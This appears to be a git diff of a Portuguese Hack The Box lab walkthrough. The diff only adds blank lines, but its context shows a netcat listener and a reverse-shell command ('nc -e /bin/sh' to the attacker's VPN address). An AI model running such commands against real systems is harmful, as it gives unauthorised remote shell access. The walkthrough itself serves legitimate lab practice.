@@ -175,6 +175,7 @@ Enviar a `reverse shell` para nosso netcat
 ```terminal
 $ rlwarp nc -nvlp YYYY
 ```
+
 > YYYY é equivalente a porta escolhida para escutar
 
 > **rlwarp** é um programa que pode ser usado junto do netcat para registrar e puxar o histórico de comandos utilizados.
@@ -183,6 +184,7 @@ $ rlwarp nc -nvlp YYYY
 ```terminal
 command > nc -e /bin/sh 10.10.XX.XX YYYY
 ```
+
 > XX é equivalente a seu ip na VPN do HTB. 
 Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr
 
